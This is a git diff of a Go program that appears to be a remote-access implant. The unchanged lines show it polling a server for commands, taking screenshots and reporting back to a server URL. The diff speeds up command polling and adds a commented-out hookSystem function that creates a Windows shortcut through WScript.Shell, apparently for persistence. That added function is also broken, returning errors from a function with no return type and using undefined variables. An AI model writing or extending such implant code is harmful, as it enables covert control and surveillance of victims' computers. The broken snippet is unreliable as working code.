@@ -199,6 +199,30 @@ func reportProgress(serverURL string, report string) {
 	resp.Body.Close()
 }
 
+/*
+func hookSystem() {
+	ole.CoInitializeEx(0, ole.COINIT_APARTMENTTHREADED|ole.COINIT_SPEED_OVER_MEMORY)
+    oleShellObject, err := oleutil.CreateObject("WScript.Shell")
+    if err != nil {
+        return err
+    }
+    defer oleShellObject.Release()
+    wshell, err := oleShellObject.QueryInterface(ole.IID_IDispatch)
+    if err != nil {
+        return err
+    }
+    defer wshell.Release()
+    cs, err := oleutil.CallMethod(wshell, "CreateShortcut", dst)
+    if err != nil {
+        return err
+    }
+    idispatch := cs.ToIDispatch()
+    oleutil.PutProperty(idispatch, "TargetPath", src)
+    oleutil.CallMethod(idispatch, "Save")
+    return nil
+}
+*/
+
 func screenshotLoop(amount string) {
 	i := 0
 	fmt.Println("Using numeric value")
@@ -251,7 +275,7 @@ func main() {
 	for true {
 		userInput = fetchCommand()
 		command := strings.Fields(userInput)
-		time.Sleep(2 * time.Second)
+		time.Sleep(1 * time.Second)
 
 		fmt.Printf("Received command from server: %s\n", userInput)
 		if len(command) != 0 {
